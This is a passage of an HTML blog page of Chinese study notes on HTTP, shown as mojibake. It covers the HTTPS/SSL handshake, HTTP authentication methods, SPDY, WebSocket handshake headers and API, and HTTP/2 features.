id="HTTPS-çš„å®‰å…¨é€šä¿¡æœºåˆ¶"><a href="#HTTPS-çš„å®‰å…¨é€šä¿¡æœºåˆ¶" class="headerlink" title="HTTPS çš„å®‰å…¨é€šä¿¡æœºåˆ¶"></a><strong>HTTPS</strong> çš„å®‰å…¨é€šä¿¡æœºåˆ¶</h4><p><img src="https://z3.ax1x.com/2021/04/22/cqyahF.png" alt="cqyahF.png"></p><p>æ­¥éª¤ <strong>1</strong>ï¼š å®¢æˆ·ç«¯é€šè¿‡å‘é€ Client Hello æŠ¥æ–‡å¼€å§‹ SSL é€šä¿¡ã€‚æŠ¥æ–‡ä¸­åŒ…å«å®¢æˆ·ç«¯æ”¯æŒçš„ SSL çš„æŒ‡å®šç‰ˆæœ¬ã€åŠ å¯†ç»„ä»¶ï¼ˆCipher Suiteï¼‰åˆ—è¡¨ï¼ˆæ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•åŠå¯†é’¥é•¿åº¦ç­‰ï¼‰ã€‚</p><p>æ­¥éª¤ <strong>2</strong>ï¼š æœåŠ¡å™¨å¯è¿›è¡Œ SSL é€šä¿¡æ—¶ï¼Œä¼šä»¥ Server Hello æŠ¥æ–‡ä½œä¸ºåº”ç­”ã€‚å’Œå®¢æˆ·ç«¯ä¸€æ ·ï¼Œåœ¨æŠ¥æ–‡ä¸­åŒ…å« SSL ç‰ˆæœ¬ä»¥åŠåŠ å¯†ç»„ä»¶ã€‚æœåŠ¡å™¨çš„åŠ å¯†ç»„ä»¶å†…å®¹æ˜¯ä»æ¥æ”¶åˆ°çš„å®¢æˆ·ç«¯åŠ å¯†ç»„ä»¶å†…ç­›é€‰å‡ºæ¥çš„ã€‚</p><p>æ­¥éª¤ <strong>3</strong>ï¼š ä¹‹åæœåŠ¡å™¨å‘é€ Certificate æŠ¥æ–‡ã€‚æŠ¥æ–‡ä¸­åŒ…å«å…¬å¼€å¯†é’¥è¯ä¹¦ã€‚</p><p>æ­¥éª¤ <strong>4</strong>ï¼š æœ€åæœåŠ¡å™¨å‘é€ Server Hello Done æŠ¥æ–‡é€šçŸ¥å®¢æˆ·ç«¯ï¼Œæœ€åˆé˜¶æ®µçš„ SSL æ¡æ‰‹åå•†éƒ¨åˆ†ç»“æŸã€‚</p><p>æ­¥éª¤ <strong>5</strong>ï¼š SSL ç¬¬ä¸€æ¬¡æ¡æ‰‹ç»“æŸä¹‹åï¼Œå®¢æˆ·ç«¯ä»¥ Client Key Exchange æŠ¥æ–‡ä½œä¸ºå›åº”ã€‚æŠ¥æ–‡ä¸­åŒ…å«é€šä¿¡åŠ å¯†ä¸­ä½¿ç”¨çš„ä¸€ç§è¢«ç§°ä¸º Pre-master secret çš„éšæœºå¯†ç ä¸²ã€‚è¯¥æŠ¥æ–‡å·²ç”¨æ­¥éª¤ 3 ä¸­çš„å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚</p><p>æ­¥éª¤ <strong>6</strong>ï¼š æ¥ç€å®¢æˆ·ç«¯ç»§ç»­å‘é€ Change Cipher Spec æŠ¥æ–‡ã€‚è¯¥æŠ¥æ–‡ä¼šæç¤ºæœåŠ¡å™¨ï¼Œåœ¨æ­¤æŠ¥æ–‡ä¹‹åçš„é€šä¿¡ä¼šé‡‡ç”¨ Pre-master secret å¯†é’¥åŠ å¯†ã€‚</p><p>æ­¥éª¤ <strong>7</strong>ï¼š å®¢æˆ·ç«¯å‘é€ Finished æŠ¥æ–‡ã€‚è¯¥æŠ¥æ–‡åŒ…å«è¿æ¥è‡³ä»Šå…¨éƒ¨æŠ¥æ–‡çš„æ•´ä½“æ ¡éªŒå€¼ã€‚è¿™æ¬¡æ¡æ‰‹åå•†æ˜¯å¦èƒ½å¤ŸæˆåŠŸï¼Œè¦ä»¥æœåŠ¡å™¨æ˜¯å¦èƒ½å¤Ÿæ­£ç¡®è§£å¯†è¯¥æŠ¥æ–‡ä½œä¸ºåˆ¤å®šæ ‡å‡†ã€‚</p><p>æ­¥éª¤ <strong>8</strong>ï¼š æœåŠ¡å™¨åŒæ ·å‘é€ Change Cipher Spec æŠ¥æ–‡ã€‚</p><p>æ­¥éª¤ <strong>9</strong>ï¼š æœåŠ¡å™¨åŒæ ·å‘é€ Finished æŠ¥æ–‡ã€‚</p><p>æ­¥éª¤ <strong>10</strong>ï¼š æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ Finished æŠ¥æ–‡äº¤æ¢å®Œæ¯•ä¹‹åï¼ŒSSL è¿æ¥å°±ç®—å»ºç«‹å®Œæˆã€‚å½“ç„¶ï¼Œé€šä¿¡ä¼šå—åˆ° SSL çš„ä¿æŠ¤ã€‚ä»æ­¤å¤„å¼€å§‹è¿›è¡Œåº”ç”¨å±‚åè®®çš„é€šä¿¡ï¼Œå³å‘é€ HTTP è¯·æ±‚ã€‚</p><p>æ­¥éª¤ <strong>11</strong>ï¼š åº”ç”¨å±‚åè®®é€šä¿¡ï¼Œå³å‘é€ HTTP å“åº”ã€‚</p><p>æ­¥éª¤ <strong>12</strong>ï¼š æœ€åç”±å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ã€‚æ–­å¼€è¿æ¥æ—¶ï¼Œå‘é€ close_notify æŠ¥æ–‡ã€‚ä¸Šå›¾åšäº†ä¸€äº›çœç•¥ï¼Œè¿™æ­¥ä¹‹åå†å‘é€ TCP FIN æŠ¥æ–‡æ¥å…³é—­ä¸ TCP çš„é€šä¿¡ã€‚</p><p>åœ¨ä»¥ä¸Šæµç¨‹ä¸­ï¼Œåº”ç”¨å±‚å‘é€æ•°æ®æ—¶ä¼šé™„åŠ ä¸€ç§å«åš MACï¼ˆMessage Authentication Codeï¼‰çš„æŠ¥æ–‡æ‘˜è¦ã€‚MAC èƒ½å¤ŸæŸ¥çŸ¥æŠ¥æ–‡æ˜¯å¦é­åˆ°ç¯¡æ”¹ï¼Œä»è€Œä¿æŠ¤æŠ¥æ–‡çš„å®Œæ•´æ€§ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/22/cqywp4.png" alt="cqywp4.png"></p><p>ä»ä»…ä½¿ç”¨æœåŠ¡å™¨ç«¯çš„å…¬å¼€å¯†é’¥è¯ä¹¦ï¼ˆæœåŠ¡å™¨è¯ä¹¦ï¼‰å»ºç«‹ HTTPS é€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹</p><h4 id="SSLå’ŒTLS"><a href="#SSLå’ŒTLS" class="headerlink" title="SSLå’ŒTLS"></a>SSLå’ŒTLS</h4><p>HTTPS ä½¿ç”¨ SSLï¼ˆSecure Socket Layerï¼‰ å’Œ TLSï¼ˆTransport Layer Securityï¼‰è¿™ä¸¤ä¸ªåè®®ã€‚</p><p>SSLç›®å‰ä¸»å¯¼æƒå·²è½¬ç§»åˆ°IETFï¼ŒIETFä»¥SSL3.0ä¸ºåŸºå‡†ï¼Œååˆ¶å®šäº†TLS1.0ã€TLS1.1ã€TLS1.2ã€‚</p><p>å½“å‰ä¸»æµSSL3.0ã€TLS1.0</p><h5 id="small-tips"><a href="#small-tips" class="headerlink" title="small_tips"></a>small_tips</h5><ul><li><strong>HTTPS</strong> æ¯” <strong>HTTP</strong> è¦æ…¢ <strong>2</strong> åˆ° <strong>100</strong> å€</li></ul><h2 id="ç¡®è®¤è®¿é—®ç”¨æˆ·èº«ä»½çš„è®¤è¯"><a href="#ç¡®è®¤è®¿é—®ç”¨æˆ·èº«ä»½çš„è®¤è¯" class="headerlink" title="ç¡®è®¤è®¿é—®ç”¨æˆ·èº«ä»½çš„è®¤è¯"></a>ç¡®è®¤è®¿é—®ç”¨æˆ·èº«ä»½çš„è®¤è¯</h2><p>æŸäº› Web é¡µé¢åªæƒ³è®©ç‰¹å®šçš„äººæµè§ˆ</p><h3 id="ä½•ä¸ºè®¤è¯"><a href="#ä½•ä¸ºè®¤è¯" class="headerlink" title="ä½•ä¸ºè®¤è¯"></a>ä½•ä¸ºè®¤è¯</h3><p>ä¸ºäº†å¼„æ¸…ç©¶ç«Ÿæ˜¯è°åœ¨è®¿é—®æœåŠ¡ å™¨ï¼Œå°±å¾—è®©å¯¹æ–¹çš„å®¢æˆ·ç«¯è‡ªæŠ¥å®¶é—¨ã€‚</p><h4 id="HTTP-1-1-ä½¿ç”¨çš„è®¤è¯æ–¹å¼"><a href="#HTTP-1-1-ä½¿ç”¨çš„è®¤è¯æ–¹å¼" class="headerlink" title="HTTP/1.1 ä½¿ç”¨çš„è®¤è¯æ–¹å¼"></a>HTTP/1.1 ä½¿ç”¨çš„è®¤è¯æ–¹å¼</h4><ul><li><strong>BASIC</strong> è®¤è¯ï¼ˆåŸºæœ¬è®¤è¯ï¼‰</li><li><strong>DIGEST</strong> è®¤è¯ï¼ˆæ‘˜è¦è®¤è¯ï¼‰</li><li><strong>SSL</strong> å®¢æˆ·ç«¯è®¤è¯</li><li><strong>FormBase</strong> è®¤è¯ï¼ˆåŸºäºè¡¨å•è®¤è¯ï¼‰</li><li>Windows ç»Ÿä¸€è®¤è¯ï¼ˆKeberos è®¤è¯ã€NTLM è®¤è¯ï¼‰</li></ul><h3 id="BASIC-è®¤è¯ï¼ˆåŸºæœ¬è®¤è¯ï¼‰"><a href="#BASIC-è®¤è¯ï¼ˆåŸºæœ¬è®¤è¯ï¼‰" class="headerlink" title="BASIC è®¤è¯ï¼ˆåŸºæœ¬è®¤è¯ï¼‰"></a><strong>BASIC</strong> è®¤è¯ï¼ˆåŸºæœ¬è®¤è¯ï¼‰</h3><p><img src="https://z3.ax1x.com/2021/04/23/cOMKtf.png" alt="cOMKtf.png"></p><p>BASIC è®¤è¯è™½ç„¶é‡‡ç”¨ Base64 ç¼–ç æ–¹å¼ï¼Œä½†è¿™ä¸æ˜¯åŠ å¯†å¤„ç†ã€‚ä¸éœ€è¦ä»»ä½•é™„åŠ ä¿¡æ¯å³å¯å¯¹å…¶è§£ç ã€‚æ¢è¨€ä¹‹ï¼Œåœ¨HTTPè¿™ç§éåŠ å¯†ä¿¡é“é€šä¿¡å°±ä¼šè¢«æˆªè·ã€‚</p><h3 id="DIGEST-è®¤è¯ï¼ˆæ‘˜è¦è®¤è¯ï¼‰"><a href="#DIGEST-è®¤è¯ï¼ˆæ‘˜è¦è®¤è¯ï¼‰" class="headerlink" title="DIGEST è®¤è¯ï¼ˆæ‘˜è¦è®¤è¯ï¼‰"></a><strong>DIGEST</strong> è®¤è¯ï¼ˆæ‘˜è¦è®¤è¯ï¼‰</h3><p>DIGEST è®¤è¯åŒæ ·ä½¿ç”¨è´¨è¯¢ / å“åº”çš„æ–¹å¼</p><p>æ‰€è°“è´¨è¯¢å“åº”æ–¹å¼æ˜¯æŒ‡ï¼Œä¸€å¼€å§‹ä¸€æ–¹ä¼šå…ˆå‘é€è®¤è¯è¦æ±‚ç»™å¦ä¸€æ–¹ï¼Œæ¥ç€ä½¿ç”¨ä»å¦ä¸€æ–¹é‚£æ¥æ”¶åˆ°çš„è´¨è¯¢ç è®¡ç®—ç”Ÿæˆå“åº”ç ã€‚æœ€åå°†å“åº”ç è¿”å›ç»™å¯¹æ–¹è¿›è¡Œè®¤è¯çš„æ–¹å¼ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMl9S.png" alt="cOMl9S.png"></p><p>DIGEST è®¤è¯æä¾›é˜²æ­¢å¯†ç è¢«çªƒå¬çš„ä¿æŠ¤æœºåˆ¶ï¼Œä½†å¹¶ä¸å­˜åœ¨é˜²æ­¢ç”¨æˆ·ä¼ªè£…çš„ä¿æŠ¤æœºåˆ¶ã€‚</p><h3 id="SSL-å®¢æˆ·ç«¯è®¤è¯"><a href="#SSL-å®¢æˆ·ç«¯è®¤è¯" class="headerlink" title="SSL å®¢æˆ·ç«¯è®¤è¯"></a><strong>SSL</strong> å®¢æˆ·ç«¯è®¤è¯</h3><p>SSL å®¢æˆ·ç«¯è®¤è¯æ˜¯å€Ÿç”± HTTPS çš„å®¢æˆ·ç«¯è¯ä¹¦å®Œæˆè®¤è¯çš„æ–¹å¼ã€‚å‡­å€Ÿå®¢æˆ·ç«¯è¯ä¹¦è®¤è¯ï¼ŒæœåŠ¡å™¨å¯ç¡®è®¤è®¿é—®æ˜¯å¦æ¥è‡ªå·²ç™»å½•çš„å®¢æˆ·ç«¯ã€‚</p><h4 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h4><p>æ­¥éª¤ <strong>1</strong>ï¼š æ¥æ”¶åˆ°éœ€è¦è®¤è¯èµ„æºçš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¼šå‘é€ Certificate Request æŠ¥æ–‡ï¼Œè¦æ±‚å®¢æˆ·ç«¯æä¾›å®¢æˆ·ç«¯è¯ä¹¦ã€‚</p><p>æ­¥éª¤ <strong>2</strong>ï¼š ç”¨æˆ·é€‰æ‹©å°†å‘é€çš„å®¢æˆ·ç«¯è¯ä¹¦åï¼Œå®¢æˆ·ç«¯ä¼šæŠŠå®¢æˆ·ç«¯è¯ä¹¦ä¿¡æ¯ä»¥ Client Certificate æŠ¥æ–‡æ–¹å¼å‘é€ç»™æœåŠ¡å™¨ã€‚</p><p>æ­¥éª¤ <strong>3</strong>ï¼š æœåŠ¡å™¨éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦éªŒè¯é€šè¿‡åæ–¹å¯é¢†å–è¯ä¹¦å†…å®¢æˆ·ç«¯çš„å…¬å¼€å¯†é’¥ï¼Œç„¶åå¼€å§‹ HTTPS åŠ å¯†é€šä¿¡ã€‚</p><h4 id="SSL-å®¢æˆ·ç«¯è®¤è¯é‡‡ç”¨åŒå› ç´ è®¤è¯"><a href="#SSL-å®¢æˆ·ç«¯è®¤è¯é‡‡ç”¨åŒå› ç´ è®¤è¯" class="headerlink" title="SSL å®¢æˆ·ç«¯è®¤è¯é‡‡ç”¨åŒå› ç´ è®¤è¯"></a><strong>SSL</strong> å®¢æˆ·ç«¯è®¤è¯é‡‡ç”¨åŒå› ç´ è®¤è¯</h4><p>åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼ŒSSL å®¢æˆ·ç«¯è®¤è¯ä¸ä¼šä»…ä¾é è¯ä¹¦å®Œæˆè®¤è¯ï¼Œä¸€èˆ¬ä¼šå’ŒåŸºäºè¡¨å•è®¤è¯ç»„åˆå½¢æˆä¸€ç§åŒå› ç´ è®¤è¯ï¼ˆTwo-factor authenticationï¼‰æ¥ä½¿ç”¨ã€‚æ¢è¨€ä¹‹ï¼Œç¬¬ä¸€ä¸ªè®¤è¯å› ç´ çš„ SSL å®¢æˆ·ç«¯è¯ä¹¦ç”¨æ¥è®¤è¯å®¢æˆ·ç«¯è®¡ç®—æœºï¼Œ å¦ä¸€ä¸ªè®¤è¯å› ç´ çš„å¯†ç åˆ™ç”¨æ¥ç¡®å®šè¿™æ˜¯ç”¨æˆ·æœ¬äººçš„è¡Œä¸ºã€‚</p><h4 id="SSL-å®¢æˆ·ç«¯è®¤è¯å¿…è¦çš„è´¹ç”¨ï¼ˆè¯ä¹¦ï¼‰"><a href="#SSL-å®¢æˆ·ç«¯è®¤è¯å¿…è¦çš„è´¹ç”¨ï¼ˆè¯ä¹¦ï¼‰" class="headerlink" title="SSL å®¢æˆ·ç«¯è®¤è¯å¿…è¦çš„è´¹ç”¨ï¼ˆè¯ä¹¦ï¼‰"></a><strong>SSL</strong> å®¢æˆ·ç«¯è®¤è¯å¿…è¦çš„è´¹ç”¨ï¼ˆè¯ä¹¦ï¼‰</h4><h3 id="åŸºäºè¡¨å•è®¤è¯"><a href="#åŸºäºè¡¨å•è®¤è¯" class="headerlink" title="åŸºäºè¡¨å•è®¤è¯"></a>åŸºäºè¡¨å•è®¤è¯</h3><p>å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡å™¨ä¸Šçš„ Web åº”ç”¨ç¨‹åºå‘é€ç™»å½•ä¿¡æ¯ï¼ˆCredentialï¼‰ï¼ŒæŒ‰ç™»å½•ä¿¡æ¯çš„éªŒè¯ç»“æœè®¤è¯ã€‚</p><h5 id="è®¤è¯å¤šåŠä¸ºåŸºäºè¡¨å•è®¤è¯"><a href="#è®¤è¯å¤šåŠä¸ºåŸºäºè¡¨å•è®¤è¯" class="headerlink" title="è®¤è¯å¤šåŠä¸ºåŸºäºè¡¨å•è®¤è¯"></a>è®¤è¯å¤šåŠä¸ºåŸºäºè¡¨å•è®¤è¯</h5><p><strong>Session</strong> ç®¡ç†åŠ <strong>Cookie</strong> åº”ç”¨</p><p><img src="https://z3.ax1x.com/2021/04/23/cOM11g.png" alt="cOM11g.png"></p><h2 id="åŸºäº-HTTP-çš„åŠŸèƒ½è¿½åŠ åè®®"><a href="#åŸºäº-HTTP-çš„åŠŸèƒ½è¿½åŠ åè®®" class="headerlink" title="åŸºäº HTTP çš„åŠŸèƒ½è¿½åŠ åè®®"></a>åŸºäº <strong>HTTP</strong> çš„åŠŸèƒ½è¿½åŠ åè®®</h2><h4 id="åŸºäº-HTTP-çš„åè®®"><a href="#åŸºäº-HTTP-çš„åè®®" class="headerlink" title="åŸºäº HTTP çš„åè®®"></a>åŸºäº <strong>HTTP</strong> çš„åè®®</h4><h4 id="æ¶ˆé™¤-HTTP-ç“¶é¢ˆçš„-SPDY"><a href="#æ¶ˆé™¤-HTTP-ç“¶é¢ˆçš„-SPDY" class="headerlink" title="æ¶ˆé™¤ HTTP ç“¶é¢ˆçš„ SPDY"></a>æ¶ˆé™¤ <strong>HTTP</strong> ç“¶é¢ˆçš„ <strong>SPDY</strong></h4><h5 id="HTTP-ç“¶é¢ˆ"><a href="#HTTP-ç“¶é¢ˆ" class="headerlink" title="HTTP ç“¶é¢ˆ"></a><strong>HTTP</strong> ç“¶é¢ˆ</h5><p><img src="https://z3.ax1x.com/2021/04/23/cOM3cQ.png" alt="cOM3cQ.png"></p><ul><li><p>Ajaxè§£å†³</p><p><img src="https://z3.ax1x.com/2021/04/23/cOM8Xj.png" alt="cOM8Xj.png"></p></li><li><p><strong>Comet</strong> è§£å†³</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMJns.png" alt="cOMJns.png"></p></li><li><p>æ¶ˆé™¤ <strong>HTTP</strong> ç“¶é¢ˆçš„ <strong>SPDY</strong></p></li></ul><h4 id="SPDY-çš„è®¾è®¡ä¸åŠŸèƒ½"><a href="#SPDY-çš„è®¾è®¡ä¸åŠŸèƒ½" class="headerlink" title="SPDY çš„è®¾è®¡ä¸åŠŸèƒ½"></a><strong>SPDY</strong> çš„è®¾è®¡ä¸åŠŸèƒ½</h4><p>SPDY æ²¡æœ‰å®Œå…¨æ”¹å†™ HTTP åè®®ï¼Œè€Œæ˜¯åœ¨ TCP/IP çš„åº”ç”¨å±‚ä¸è¿è¾“å±‚ä¹‹é—´é€šè¿‡æ–°åŠ ä¼šè¯å±‚çš„å½¢å¼è¿ä½œã€‚åŒæ—¶ï¼Œè€ƒè™‘åˆ°å®‰å…¨æ€§é—®é¢˜ï¼ŒSPDY è§„å®šé€šä¿¡ä¸­ä½¿ç”¨ SSLã€‚</p><p>SPDY ä»¥ä¼šè¯å±‚çš„å½¢å¼åŠ å…¥ï¼Œæ§åˆ¶å¯¹æ•°æ®çš„æµåŠ¨ï¼Œä½†è¿˜æ˜¯é‡‡ç”¨ HTTP å»ºç«‹é€šä¿¡è¿æ¥ã€‚å› æ­¤ï¼Œå¯ç…§å¸¸ä½¿ç”¨ HTTP çš„ GET å’Œ POST ç­‰æ–¹ æ³•ã€Cookie ä»¥åŠ HTTP æŠ¥æ–‡ç­‰ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMYBn.png" alt="cOMYBn.png"></p><h5 id="æ–°åŠŸèƒ½"><a href="#æ–°åŠŸèƒ½" class="headerlink" title="æ–°åŠŸèƒ½"></a>æ–°åŠŸèƒ½</h5><ul><li>å¤šè·¯å¤ç”¨æµ</li><li>èµ‹äºˆè¯·æ±‚ä¼˜å…ˆçº§</li><li>å‹ç¼© <strong>HTTP</strong> é¦–éƒ¨</li><li>æ¨é€åŠŸèƒ½</li><li>æœåŠ¡å™¨æç¤ºåŠŸèƒ½</li></ul><h4 id="SPDY-å¤§ä½“ä¸Šæ¶ˆé™¤äº†-Web-ç“¶é¢ˆ"><a href="#SPDY-å¤§ä½“ä¸Šæ¶ˆé™¤äº†-Web-ç“¶é¢ˆ" class="headerlink" title="SPDY å¤§ä½“ä¸Šæ¶ˆé™¤äº† Web ç“¶é¢ˆ"></a><strong>SPDY</strong> å¤§ä½“ä¸Šæ¶ˆé™¤äº† <strong>Web</strong> ç“¶é¢ˆ</h4><h3 id="ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„WebSocket"><a href="#ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„WebSocket" class="headerlink" title="ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„WebSocket"></a>ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„<strong>WebSocket</strong></h3><p>WebSocket ç½‘ç»œæŠ€æœ¯æ­£æ˜¯ä¸ºè§£å†³è¿™äº›é—®é¢˜è€Œå®ç°çš„ä¸€å¥—æ–°åè®®åŠ APIã€‚</p><p> WebSocket æŠ€æœ¯ä¸»è¦æ˜¯ä¸ºäº†è§£å†³ Ajax å’Œ Comet é‡Œ XMLHttpRequest é™„å¸¦çš„ç¼ºé™·æ‰€å¼•èµ·çš„é—®é¢˜ã€‚</p><h4 id="WebSocket-åè®®"><a href="#WebSocket-åè®®" class="headerlink" title="WebSocket åè®®"></a>WebSocket åè®®</h4><p>ä¸€æ—¦ Web æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹èµ· WebSocket åè®®çš„é€šä¿¡è¿æ¥ï¼Œ ä¹‹åæ‰€æœ‰çš„é€šä¿¡éƒ½ä¾é è¿™ä¸ªä¸“ç”¨åè®®è¿›è¡Œã€‚é€šä¿¡è¿‡ç¨‹ä¸­å¯äº’ç›¸å‘é€JSONã€XMLã€HTML æˆ–å›¾ç‰‡ç­‰ä»»æ„æ ¼å¼çš„æ•°æ®ã€‚</p><p>ç”±äºæ˜¯å»ºç«‹åœ¨ HTTP åŸºç¡€ä¸Šçš„åè®®ï¼Œå› æ­¤è¿æ¥çš„å‘èµ·æ–¹ä»æ˜¯å®¢æˆ·ç«¯ï¼Œ è€Œä¸€æ—¦ç¡®ç«‹ WebSocket é€šä¿¡è¿æ¥ï¼Œä¸è®ºæœåŠ¡å™¨è¿˜æ˜¯å®¢æˆ·ç«¯ï¼Œä»»æ„ä¸€æ–¹éƒ½å¯ç›´æ¥å‘å¯¹æ–¹å‘é€æŠ¥æ–‡ã€‚</p><h5 id="æ–°ç‰¹ç‚¹"><a href="#æ–°ç‰¹ç‚¹" class="headerlink" title="æ–°ç‰¹ç‚¹"></a>æ–°ç‰¹ç‚¹</h5><ul><li>æ¨é€åŠŸèƒ½</li><li>å‡å°‘é€šä¿¡é‡</li></ul><h4 id="å®ç°-WebSocket-é€šä¿¡"><a href="#å®ç°-WebSocket-é€šä¿¡" class="headerlink" title="å®ç° WebSocket é€šä¿¡"></a>å®ç° WebSocket é€šä¿¡</h4><p>å®Œæˆä¸€æ¬¡æ¡æ‰‹</p><h5 id="æ¡æ‰‹è¯·æ±‚"><a href="#æ¡æ‰‹è¯·æ±‚" class="headerlink" title="æ¡æ‰‹è¯·æ±‚"></a>æ¡æ‰‹è¯·æ±‚</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /chat  HTTP/1.1 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">server.example.com </span></span><span class="token header"><span class="token header-name keyword">Upgrade</span><span class="token punctuation">:</span> <span class="token header-value">websocket Connection: Upgrade</span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Key</span><span class="token punctuation">:</span> <span class="token header-value">dGhlIHNhbXBsZSBub25jZQ== </span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> <span class="token header-value">chat, superchat </span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Version</span><span class="token punctuation">:</span> <span class="token header-value">13</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨åˆ° HTTP çš„ Upgrade é¦–éƒ¨å­—æ®µï¼Œå‘ŠçŸ¥æœåŠ¡å™¨é€šä¿¡åè®®å‘ç”Ÿæ”¹å˜ã€‚</p><p>Sec-WebSocket-Key å­—æ®µå†…è®°å½•ç€æ¡æ‰‹è¿‡ç¨‹ä¸­å¿…ä¸å¯å°‘çš„é”®å€¼ã€‚Sec-WebSocket-Protocol å­—æ®µå†…è®°å½•ä½¿ç”¨çš„å­åè®®ã€‚</p><h5 id="æ¡æ‰‹å“åº”"><a href="#æ¡æ‰‹å“åº”" class="headerlink" title="æ¡æ‰‹å“åº”"></a>æ¡æ‰‹å“åº”</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">101</span> <span class="token reason-phrase string">Switching Protocols</span></span><span class="token header"><span class="token header-name keyword">Upgrade</span><span class="token punctuation">:</span> <span class="token header-value">websocket </span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">Upgrade</span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Accept</span><span class="token punctuation">:</span> <span class="token header-value">s3pPLMBiTxaQ9kYGzzhZRbK+xOo= </span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> <span class="token header-value">chat</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Sec-WebSocket-Accept çš„å­—æ®µå€¼æ˜¯ç”±æ¡æ‰‹è¯·æ±‚ä¸­çš„ Sec-WebSocket-Key çš„å­—æ®µå€¼ç”Ÿæˆçš„ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMt7q.png" alt="cOMt7q.png"></p><h4 id="WebSocket-API"><a href="#WebSocket-API" class="headerlink" title="WebSocket API"></a>WebSocket API</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>'ws<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>game<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">12010</span><span class="token operator">/</span> socket<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>bufferedAmount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">getUpdateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><h4 id="HTTP-2-0ç‰¹ç‚¹"><a href="#HTTP-2-0ç‰¹ç‚¹" class="headerlink" title="HTTP/2.0ç‰¹ç‚¹"></a>HTTP/2.0ç‰¹ç‚¹</h4><table><thead><tr><th>å‹ç¼©</th><th><strong>SPDY</strong>ã€<strong>Friendly</strong></th></tr></thead><tbody><tr><td>å¤šè·¯å¤ç”¨</td><td>SPDY</td></tr><tr><td>TLS ä¹‰åŠ¡åŒ–</td><td>Speedï¼‹ Mobility</td></tr><tr><td>åå•†</td><td>Speedï¼‹ Mobilityï¼ŒFriendly</td></tr><tr><td>å®¢æˆ·ç«¯æ‹‰æ›³ï¼ˆClient Pullï¼‰/æœåŠ¡å™¨æ¨é€  ï¼ˆServer Pushï¼‰</td><td>Speedï¼‹ Mobility</td></tr><tr><td>æµé‡æ§åˆ¶</td><td>SPDY</td></tr><tr><td>WebSocket</td><td>Speedï¼‹ Mobility</td></tr></tbody></table><p>æ³¨ï¼šHTTP Speed ï¼‹ Mobility ç®€å†™ä¸º Speed ï¼‹ Mobilityï¼ŒNetwork-Friendly HTTP Upgrade ç®€å†™ä¸º Friendlyã€‚</p><h3 id="Web-æœåŠ¡å™¨ç®¡ç†æ–‡ä»¶çš„-WebDAV"><a href="#Web-æœåŠ¡å™¨ç®¡ç†æ–‡ä»¶çš„-WebDAV" class="headerlink" title="Web æœåŠ¡å™¨ç®¡ç†æ–‡ä»¶çš„ WebDAV"></a><strong>Web</strong> æœåŠ¡å™¨ç®¡ç†æ–‡ä»¶çš„ <strong>WebDAV</strong></h3><p>WebDAVï¼ˆWeb-based Distributed Authoring and 